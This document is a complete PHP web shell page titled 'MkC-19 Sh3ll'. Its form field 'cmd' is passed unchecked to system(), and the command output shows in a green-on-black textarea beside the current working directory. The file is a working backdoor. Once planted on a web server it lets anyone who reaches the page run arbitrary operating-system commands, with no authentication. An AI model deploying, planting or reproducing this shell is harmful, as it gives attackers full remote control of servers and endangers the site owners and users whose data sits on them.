<!doctype HTML>
  <head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>MkC-19-Sh3ll</title>
      <style>
          body{color:black;
               background-color:rgb(74, 82, 60);
               font-family: 'Times New Roman', Times, serif;
               font-style: oblique;

            }
          h3{color:rgba( red, green, blue, alpha);
             background-attachment:scroll;
             background-color:forestgreen;
             border-radius:6px;
          }
          .command-output{
              background-color: black;
              color:green;
              padding: 5px;

              outline:5px solid #bbb;
         }
         input{ border-radius:6px;
              width :250px;
              background-color:black;
              color:green;
        }
      </style>
    <body>
       <h3>MkC-19 Sh3ll</h3>
        <br/>
       <form name"Command" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="get">
         <input type="text" name="cmd">
       </form>
      <?php $cwd = getcwd(); echo "<h3>[".$cwd."></h3>";?>

     <textarea class="command-output" readonly="true" spellcheck="false" style="margin: 0px; height: 357px;" >
<?php
$cmd = $_GET['cmd'];
system($cmd);
echo '</textarea>';
echo '</body></html>';
?>
